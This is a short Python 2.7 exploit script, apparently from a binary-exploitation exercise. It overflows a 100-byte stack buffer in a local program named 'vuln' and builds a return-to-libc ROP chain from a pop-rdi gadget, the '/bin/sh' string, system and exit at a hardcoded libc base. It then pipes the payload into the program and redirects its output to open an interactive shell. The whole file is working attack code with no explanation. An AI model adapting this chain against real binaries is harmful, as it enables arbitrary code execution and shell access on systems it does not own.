#!/usr/bin/env python2.7

import struct
from subprocess import Popen, PIPE

libc_base = 0x7ffff7a14000
bufsize = 100

offset_libc_system = 0x46530
offset_libc_exit = 0x3c180
offset_libc_binsh = 0x17d81b
offset_libc_pop_rdi = 0x22a0a

buf = 'A' * bufsize
buf += 'A' * (8-len(buf) % 8)
buf += 'AAAAAAAA' * 2
buf += struct.pack('<Q', libc_base + offset_libc_pop_rdi)
buf += struct.pack('<Q', libc_base + offset_libc_binsh)
buf += struct.pack('<Q', libc_base + offset_libc_system)
buf += struct.pack('<Q', libc_base + offset_libc_pop_rdi)
buf += struct.pack('<Q', 0)
buf += struct.pack('<Q', libc_base + offset_libc_exit)

p = Popen(['./vuln'], stdin=PIPE, stdout=PIPE)
p.stdin.write(buf+'\n')
p.stdin.write('exec <&2 >&2\n')
p.wait()